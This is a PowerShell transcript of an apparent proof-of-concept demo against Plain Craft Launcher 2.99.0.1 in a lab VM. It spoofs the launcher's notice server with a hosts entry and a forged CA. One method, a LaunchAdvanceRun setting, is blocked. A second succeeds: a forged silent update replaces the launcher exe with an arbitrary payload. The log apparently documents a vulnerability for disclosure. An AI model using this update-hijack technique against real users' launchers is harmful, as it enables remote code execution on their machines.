@@ -1,0 +1,168 @@
+﻿**********************
+Windows PowerShell transcript start
+Start time: 20261025030453
+Username: W-\Administrator
+RunAs User: W-\Administrator
+Configuration Name: 
+Machine: W- (Microsoft Windows NT 10.0.19044.0)
+Host Application: powershell.exe -NoProfile -ExecutionPolicy Bypass -File D:\pcl-test\demo.ps1
+Process ID: 3864
+PSVersion: 5.1.19041.1237
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.1237
+BuildVersion: 10.0.19041.1237
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Waiting for the desktop ...
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step1
+==============================================================
+
+Windows 10 Enterprise LTSC 2021 - isolated lab VM. PCL 2.99.0.1 (build 415).
+
+  computer : W-
+  user     : Administrator
+  OS       : Microsoft Windows 10 Enterprise LTSC
+  display  : 1920x1080 (1920x1020)
+  network  : no NIC attached
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step2
+==============================================================
+
+Copy PCL 2.99.0.1.zip to the Desktop.
+
+  C:\Users\Administrator\Desktop\PCL-2.99.0.1.zip
+  size   : 2673993 bytes
+  sha256 : 4D239A62ED66FB9EBCF4633FD881EB098E9A7E4F296F0E414B58AA2F1F7F7830
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step3
+==============================================================
+
+Extract the new PCL to Desktop\PCL.
+
+  C:\Users\Administrator\Desktop\PCL\Plain Craft Launcher 2.exe
+  size   : 6013952 bytes
+  sha256 : 0DB34E19D9EEB6D496D20FABE786EC16BBD36BA6B0CCDC8D29CB7E909C114397
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step4
+==============================================================
+
+Run the PoC: forged notice server, hosts entry and a lab CA.
+
+  target : pcl2-server-1253424809.file.myqcloud.com
+  hosts  : 127.0.0.1
+  server : https://127.0.0.1:443 (PowerShell TlsListener)
+  notice : id 11002, importantLevel 999
+
+  notice.json -> actions.setup:
+    "LaunchAdvanceRun": "C:\\Users\\Public\\pclpoc.exe"
+
+  Starting the PoC and PCL ...
+
+[03:05:28] PCL: C:\Users\Administrator\Desktop\PCL\Plain Craft Launcher 2.exe
+[03:05:29] hosts already contains the lab entry.
+[03:05:29] DNS cache flushed.
+[03:05:29] Generating lab CA and leaf certificates ...
+[03:05:31] CA generated: 98D33A82388DDAB8F63D9099F63A2343E4ED6C3C
+[03:05:31] leaf generated: F892D85ED609589BAFDB3D82B65D69183384E994
+[03:05:32] payload compiled: C:\Users\Public\pclpoc.exe
+[03:05:35] PoC server listening on https://127.0.0.1:443 (mode=launch)
+[03:05:35] Starting PCL ...
+[03:05:36] PCL PID 2500
+
+>>> In PCL, click "Start Game" (a working Minecraft instance is required).
+>>> This is what runs the LaunchAdvanceRun payload.
+
+[03:05:36] Waiting up to 40 seconds for C:\Users\ADMINI~1\AppData\Local\Temp\pcl-poc-marker.txt ...
+
+[-] No marker file was produced.
+    PCL log: C:\Users\Administrator\Desktop\PCL\PCL\Log*.txt
+    server log: C:\PCLPoC\backup\server.out.log
+
+[03:05:57] Cleanup ...
+[03:05:57] CA removed.
+[03:05:57] leaf certificate removed.
+[03:05:58] hosts restored.
+[03:05:58] PCL registry restored.
+[03:05:58] Done.
+
+--- Method 1 result ---
+  no marker: LaunchAdvanceRun was not executed.
+  PCL log: C:\Users\Administrator\Desktop\PCL\PCL\Log1.txt
+  62: 03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret] 执行 PCL 服务器公告动作失败（setup, {
+  63: 03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret]   "LaunchAdvanceRun": "C:\\Users\\Public\\pclpoc.exe",
+  64: 03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret]   "LaunchAdvanceRunWait": "False"
+  65: 03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret] }）：被禁止的设置项：LaunchAdvanceRun
+
+  2.99.0.1 setup blacklist rejects LaunchAdvanceRun before saving it.
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step6
+==============================================================
+
+Delete the entire PCL directory.
+
+  C:\Users\Administrator\Desktop\PCL
+  exists after delete: False
+
+  A clean copy is extracted again for method 2.
+==============================================================
+ PCL 2.99.0.1 PoC demo  |  step7
+==============================================================
+
+Method 2: notice.cfg + slientupdate -> silent update -> arbitrary exe.
+
+  notice.cfg  : 11002|0|0|0|999
+  ServerConfig: Update.Release.DownloadUrls -> https://.../update.zip
+  update.zip  : Plain Craft Launcher 2.exe (payload)
+
+  Starting the PoC and PCL ...
+
+[03:06:24] PCL: C:\Users\Administrator\Desktop\PCL\Plain Craft Launcher 2.exe
+[03:06:24] hosts already contains the lab entry.
+[03:06:24] DNS cache flushed.
+[03:06:24] Generating lab CA and leaf certificates ...
+[03:06:24] CA generated: 5905F23B030711502A1BE07211CA919E638404A5
+[03:06:24] leaf generated: 14654FAC23BE9D40AF14DAF305B15EE8DAB81B03
+[03:06:24] payload compiled: C:\Users\Public\pclpoc.exe
+[03:06:27] PoC server listening on https://127.0.0.1:443 (mode=update)
+[03:06:27] Starting PCL ...
+[03:06:28] PCL PID 2444
+[03:06:28] Waiting for the silent update to stage PCL\Plain Craft Launcher 2.exe ...
+[03:06:32] update payload staged.
+[03:06:34] Closing PCL PID 2444 ...
+[03:06:35] Waiting up to 60 seconds for C:\Users\ADMINI~1\AppData\Local\Temp\pcl-poc-marker.txt ...
+
+[+] SUCCESS: payload executed.
+    2026-10-25T03:06:35.7399399+08:00 pid=2264 args=--update 2444 Plain Craft Launcher 2.exe Plain Cra
+ft Launcher 2.exe False
+
+[03:06:36] Cleanup ...
+[03:06:36] CA removed.
+[03:06:36] leaf certificate removed.
+[03:06:36] hosts restored.
+[03:06:36] PCL registry restored.
+[03:06:36] Done.
+
+--- Method 2 result ---
+  marker:
+    2026-10-25T03:06:35.7399399+08:00 pid=2264 args=--update 2444 Plain Craft Launcher 2.exe Plain Craft Launcher 2.exe False
+
+  staged exe : D:\pcl-test\evidence\staging.exe (4096 bytes)
+  sha256     : DA949D1F40D1DD40BA80C0CEEAB43278EDA92FA680A0551ACAFF0E39BC12CB6D
+  update.zip : Plain Craft Launcher 2.exe (4096 bytes)
+  entry sha256: DA949D1F40D1DD40BA80C0CEEAB43278EDA92FA680A0551ACAFF0E39BC12CB6D
+  hash match  : the downloaded zip entry ran.
+  calc.exe    : started (visible on the right)
+
+--- Summary ---
+  Method 1 (setup -> LaunchAdvanceRun): BLOCKED
+  Method 2 (slientupdate -> exe)     : SUCCESS
+
+  Opening RESULT.txt on the right ...
+**********************
+Windows PowerShell transcript end
+End time: 20261025030711
+**********************
